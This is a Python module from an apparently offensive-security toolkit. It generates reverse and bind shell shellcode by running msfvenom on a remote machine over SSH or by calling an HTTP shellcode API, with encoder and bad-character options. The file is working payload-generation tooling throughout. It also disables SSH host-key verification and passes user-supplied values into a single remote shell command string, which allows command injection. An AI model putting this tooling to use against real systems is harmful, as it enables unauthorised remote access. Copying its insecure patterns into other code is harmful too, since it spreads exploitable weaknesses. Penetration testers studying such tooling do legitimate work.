"""Remote connector for shellcode generation on remote machines.

This connector allows shellcode generation on remote machines via SSH
or HTTP API calls. Useful for cloud-based generation or when msfvenom
is not available locally.
"""

import json
import logging
import subprocess
from urllib.parse import urljoin

import httpx

from ofx.settings import settings

from .base import ShellcodeConnector

logger = logging.getLogger(settings.app_branding)


class RemoteSSHConnector(ShellcodeConnector):
    """Generate shellcode on a remote machine via SSH.

    Executes msfvenom (or other tools) on a remote machine via SSH.
    Requires SSH key-based authentication to be configured.

    Attributes:
        host: Remote hostname or IP
        user: SSH username
        port: SSH port (default: 22)
        identity_file: Path to SSH private key (optional)
        remote_command: Command template for remote execution

    Example:
        >>> connector = RemoteSSHConnector(
        ...     host='kali.example.com',
        ...     user='pentester'
        ... )
        >>> shellcode = connector.generate(
        ...     os_target='linux',
        ...     arch='x64',
        ...     shell_type='reverse',
        ...     ip='192.168.1.100',
        ...     port=4444
        ... )
    """

    def __init__(
        self,
        host: str,
        user: str = "root",
        port: int = 22,
        identity_file: str | None = None,
        remote_command: str = "msfvenom",
    ):
        """Initialize SSH remote connector.

        Args:
            host: Remote hostname or IP address
            user: SSH username (default: 'root')
            port: SSH port (default: 22)
            identity_file: Path to SSH private key file
            remote_command: Command to execute on remote (default: 'msfvenom')
        """
        super().__init__(
            name=f"remote-ssh-{host}",
            description=f"SSH remote shellcode generator on {user}@{host}"
        )
        self.host = host
        self.user = user
        self.port = port
        self.identity_file = identity_file
        self.remote_command = remote_command

    def _check_availability(self) -> bool:
        """Check if SSH connection is available.

        Returns:
            True if can connect to remote host, False otherwise
        """
        try:
            cmd = ["ssh"]
            if self.identity_file:
                cmd.extend(["-i", self.identity_file])
            cmd.extend([
                "-p", str(self.port),
                "-o", "ConnectTimeout=5",
                "-o", "StrictHostKeyChecking=no",
                f"{self.user}@{self.host}",
                "which", self.remote_command
            ])

            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=10,
            )

            if result.returncode == 0:
                logger.debug(f"SSH connection to {self.host} successful")
                return True
            else:
                logger.debug(f"Remote command '{self.remote_command}' not found on {self.host}")
                return False

        except Exception as e:
            logger.debug(f"SSH connection to {self.host} failed: {e}")
            return False

    def generate(
        self,
        os_target: str,
        arch: str,
        shell_type: str,
        ip: str,
        port: int,
        bad_chars: list[str] | None = None,
        encoder: str | None = None,
        iterations: int = 1,
        custom_params: dict | None = None,
    ) -> bytes:
        """Generate shellcode via SSH on remote machine.

        Args:
            os_target: Target OS
            arch: Target architecture
            shell_type: Shellcode type
            ip: IP address
            port: Port number
            bad_chars: Bad characters to avoid
            encoder: Encoder name
            iterations: Encoding iterations
            custom_params: Additional parameters

        Returns:
            Raw shellcode bytes

        Raises:
            RuntimeError: If SSH execution fails
        """
        if not self.is_available():
            raise RuntimeError(f"SSH connection to {self.host} not available") from None

        self.validate_parameters(os_target, arch, shell_type, ip, port)

        from .msfvenom import MsfvenomConnector


        msfvenom_connector = MsfvenomConnector()
        payload = msfvenom_connector._get_payload_name(os_target, arch, shell_type)

        remote_cmd = [self.remote_command, "-p", payload]

        if shell_type.lower() in ["reverse", "bind"]:
            if shell_type.lower() == "reverse":
                remote_cmd.extend([f"LHOST={ip}", f"LPORT={port}"])
            else:
                remote_cmd.extend([f"RHOST={ip}", f"LPORT={port}"])

        if bad_chars:
            bad_chars_str = "".join(bad_chars)
            remote_cmd.extend(["-b", bad_chars_str])

        if encoder:
            remote_cmd.extend(["-e", encoder, "-i", str(iterations)])

        remote_cmd.extend(["-f", "raw"])

        ssh_cmd = ["ssh"]
        if self.identity_file:
            ssh_cmd.extend(["-i", self.identity_file])
        ssh_cmd.extend([
            "-p", str(self.port),
            "-o", "StrictHostKeyChecking=no",
            f"{self.user}@{self.host}",
            " ".join(remote_cmd)
        ])

        logger.debug(f"Executing SSH command: {' '.join(ssh_cmd)}")

        try:
            result = subprocess.run(
                ssh_cmd,
                capture_output=True,
                check=True,
                timeout=60,
            )

            shellcode = result.stdout
            if not shellcode:
                raise RuntimeError("Remote command returned empty shellcode") from None

            logger.info(
                f"Generated shellcode via SSH on {self.host}: {len(shellcode)} bytes"
            )
            return shellcode

        except subprocess.CalledProcessError as e:
            error_msg = e.stderr.decode('utf-8', errors='ignore') if e.stderr else str(e)
            raise RuntimeError(f"SSH execution failed: {error_msg}") from e
        except subprocess.TimeoutExpired:
            raise RuntimeError("SSH execution timed out after 60 seconds") from None


class RemoteHTTPConnector(ShellcodeConnector):
    """Generate shellcode via HTTP API.

    Connects to a remote HTTP API that generates shellcode. Useful for
    cloud services, internal tools, or custom shellcode generation servers.

    Attributes:
        base_url: Base URL of the API
        api_key: Optional API key for authentication
        timeout: Request timeout in seconds

    Example:
        >>> connector = RemoteHTTPConnector(
        ...     base_url='https://shellcode.example.com/api',
        ...     api_key='secret-key-123'
        ... )
        >>> shellcode = connector.generate(
        ...     os_target='windows',
        ...     arch='x64',
        ...     shell_type='reverse',
        ...     ip='10.0.0.1',
        ...     port=443
        ... )
    """

    def __init__(
        self,
        base_url: str,
        api_key: str | None = None,
        timeout: int = 30,
        endpoint: str = "/generate",
    ):
        """Initialize HTTP API connector.

        Args:
            base_url: Base URL of the API (e.g., 'https://api.example.com')
            api_key: Optional API key for authentication
            timeout: Request timeout in seconds (default: 30)
            endpoint: API endpoint path (default: '/generate')
        """
        super().__init__(
            name=f"remote-http-{base_url}",
            description=f"HTTP API shellcode generator at {base_url}"
        )
        self.base_url = base_url.rstrip('/')
        self.api_key = api_key
        self.timeout = timeout
        self.endpoint = endpoint

    def _check_availability(self) -> bool:
        """Check if HTTP API is available.

        Returns:
            True if API is reachable, False otherwise
        """
        try:
            url = urljoin(self.base_url, "/health")
            headers = {}
            if self.api_key:
                headers["Authorization"] = f"Bearer {self.api_key}"

            response = httpx.get(url, headers=headers, timeout=5)

            if response.status_code in [200, 404]:
                logger.debug(f"HTTP API at {self.base_url} is reachable")
                return True
            else:
                logger.debug(f"HTTP API returned status {response.status_code}")
                return False

        except Exception as e:
            logger.debug(f"HTTP API connection failed: {e}")
            return False

    def generate(
        self,
        os_target: str,
        arch: str,
        shell_type: str,
        ip: str,
        port: int,
        bad_chars: list[str] | None = None,
        encoder: str | None = None,
        iterations: int = 1,
        custom_params: dict | None = None,
    ) -> bytes:
        """Generate shellcode via HTTP API.

        Sends a POST request to the API endpoint with shellcode parameters
        and expects raw bytes in response.

        Args:
            os_target: Target OS
            arch: Target architecture
            shell_type: Shellcode type
            ip: IP address
            port: Port number
            bad_chars: Bad characters to avoid
            encoder: Encoder name
            iterations: Encoding iterations
            custom_params: Additional API-specific parameters

        Returns:
            Raw shellcode bytes

        Raises:
            RuntimeError: If API request fails

        Example API request format:
            POST /generate
            {
                "os_target": "linux",
                "arch": "x64",
                "shell_type": "reverse",
                "ip": "192.168.1.100",
                "port": 4444,
                "bad_chars": ["\\x00"],
                "encoder": "x64/xor_dynamic"
            }
        """
        if not self.is_available():
            raise RuntimeError(f"HTTP API at {self.base_url} not available") from None

        self.validate_parameters(os_target, arch, shell_type, ip, port)

        url = urljoin(self.base_url, self.endpoint)
        headers = {
            "Content-Type": "application/json",
        }

        if self.api_key:
            headers["Authorization"] = f"Bearer {self.api_key}"

        payload = {
            "os_target": os_target.lower(),
            "arch": arch.lower(),
            "shell_type": shell_type.lower(),
            "ip": ip,
            "port": port,
        }

        if bad_chars:
            payload["bad_chars"] = bad_chars

        if encoder:
            payload["encoder"] = encoder
            payload["iterations"] = iterations

        if custom_params:
            payload.update(custom_params)

        logger.debug(f"Sending request to {url}: {json.dumps(payload, indent=2)}")

        try:
            response = httpx.post(
                url,
                json=payload,
                headers=headers,
                timeout=self.timeout,
            )

            response.raise_for_status()

            shellcode = response.content

            if not shellcode:
                raise RuntimeError("API returned empty response") from None

            logger.info(
                f"Generated shellcode via HTTP API: {len(shellcode)} bytes"
            )
            return shellcode

        except httpx.HTTPStatusError as e:
            error_msg = e.response.text if e.response else str(e)
            raise RuntimeError(f"HTTP API error ({e.response.status_code}): {error_msg}") from e
        except httpx.TimeoutException:
            raise RuntimeError(f"HTTP API request timed out after {self.timeout} seconds") from None
        except Exception as e:
            raise RuntimeError(f"HTTP API request failed: {e}") from e
